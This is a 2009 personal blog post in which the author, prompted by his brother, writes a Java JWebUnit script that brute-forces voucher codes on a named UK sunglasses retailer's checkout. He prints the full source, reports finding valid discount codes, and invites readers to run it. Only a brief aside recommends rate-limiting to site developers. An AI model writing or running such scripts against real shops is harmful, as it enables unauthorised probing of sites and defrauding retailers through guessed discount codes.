---
title: Voucher codes and promo wotsits
author: matt
type: post
date: 2009-01-22T11:22:09+00:00
url: /blog/2009/01/22/voucher-codes-and-promo-wotsits/
categories:
  - software
  - Uncategorized
tags:
  - experiments
  - java
  - security
  - voucher codes

---
It’s 2009! Our digital lives are a breeze and online shopping is just one more option to the newly empowered consumer. Right?

I’m sure I’m not alone in finding the process of buying anything a little tedious now:

  1. See something in the shop you like
  2. Decide not to buy it because you don’t know if that’s a good price
  3. You get home and look on the internet
  4. Now you have to poke around a few websites and try to work out which is cheapest when you consider postage and tax etc.
  5. Maybe one of the sites gives you rebate if you go through a referal like [quidco](http://www.quidco.com/)
  6. Maybe the site would give a discount if only you had a voucher code

If you ask me, It’s all a pain in the ass.

My brother emailed me yesterday:

> Anyway you can crack into this site to find some good discount codes? http://www.designersunglasses.co.uk
> 
> BR20 for 20% as expired.

I recognised this. He’s at stage 6 I thought (or at least I would have done if I’d numbered the stages in my head like I have above). He’s googled for a code but only found one that’s out of date.

I started to pen my reply:

> I know I work with computers but there’s no way I can find out what the codes are, they’ll all be validated server-side when you try a code…

Then it hit me. Why not just brute force the code? Worth a shot right?

I cobbled together a littler bit of java to try various combinations of 2 characters followed by 2 digits based on the fact that the expired code was BR20 for 20%. The code below uses [JWebUnit](http://jwebunit.sourceforge.net/) which is simply a convenience wrapper for HtmlUnit.

Long story short, it found several codes! One of which was for quite a substantial discount. I’m not going to post the codes (don’t bother asking). If you want a code, you’re welcome to run the sourcecode below or write your own. If the voucher code gets posted on the internet, it’ll probably get disabled pretty quickly too.

Has anyone else written similar things? I’m curious to what other approaches people may have taken. I also think it wouldn’t be too hard to make this a generic application that rattles through all possible codes for a user-supplied regex.

My advise to web developers for anything like this would be to introduce a delay after a few invalid guesses and then start doubling the length of the delay with each invalid guess. This would quickly make any brute force technique pretty useless.

```
[code lang="java"]
import net.sourceforge.jwebunit.junit.WebTestCase;

public class CodeFinderTest extends WebTestCase {

    public void setUp() throws Exception {
        super.setUp();
        setBaseUrl("http://www.designersunglasses.co.uk");
    }

    public void test1() {
        beginAt("/mens_sunglasses/d_g_dd3011-c96785p138605.html");
        submit();

        for (int perc = 20; perc <= 100; perc += 5) {
            for (char firstLetter = 'A'; firstLetter <= 'Z'; firstLetter++) {
                System.out.println();
                for (char secondLetter = 'A'; secondLetter <= 'Z'; secondLetter++) {

                    // generate the next code to try
                    String code = Character.toString(firstLetter)
                            + Character.toString(secondLetter) + perc;
                    System.out.print(code + ",");

                    // basket_campaign_code is the html id of the text field
                    setTextField("basket_campaign_code", code);
                    submit();

                    // if the response didn't say "invalid code" then it must have said something else...
                    if (!getPageSource().contains(
                            "You have entered an invalid code")) {
                        System.out.print("\nWAHOO!: " + code);
                        // lets get greedy and bump up the percentage discount...
                        firstLetter = secondLetter = 'Z';
                        break;
                    }
                }
            }
        }
    }
}

[/code]
```